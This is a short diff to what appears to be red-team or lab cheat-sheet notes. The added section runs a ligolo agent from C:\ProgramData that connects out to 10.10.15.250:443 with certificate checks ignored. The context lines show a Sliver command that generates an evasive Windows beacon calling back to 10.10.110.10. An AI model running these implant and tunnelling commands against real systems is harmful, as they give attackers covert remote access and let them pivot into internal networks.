@@ -114,6 +114,11 @@ sliver > generate beacon --http 10.10.110.10 --os windows --evasion --seconds 5 
 sliver > 
 ```
 
+## Executing Ligolo
+```bash
+execute C:\\ProgramData\\lig.exe -connect 10.10.15.250:443 -ignore-cert
+```
+
 ## Setting up a Listener
 ```bash
 # Setup a listener for beacons on port 80
